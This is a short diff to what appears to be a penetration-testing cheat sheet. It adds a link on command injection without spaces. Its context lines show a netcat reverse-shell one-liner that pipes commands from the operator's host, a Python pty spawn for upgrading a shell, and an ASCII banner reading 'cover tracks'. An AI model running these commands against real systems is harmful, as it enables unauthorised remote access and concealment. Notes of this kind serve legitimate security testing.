@@ -64,6 +64,8 @@ nc myip 1234 | sh 2>&1 | nc myip 1235
 #get a tty from within a reverse shell
 python -c 'import pty; pty.spawn("/bin/sh")'
 
+#cmd injection without spaces
+http://www.betterhacker.com/2016/10/command-injection-without-spaces.html
 ____ ____ _  _ ____ ____    ___ ____ ____ ____ _  _ ____ 
 |    |  | |  | |___ |__/     |  |__/ |__| |    |_/  [__  
 |___ |__|  \/  |___ |  \     |  |  \ |  | |___ | \_ ___]
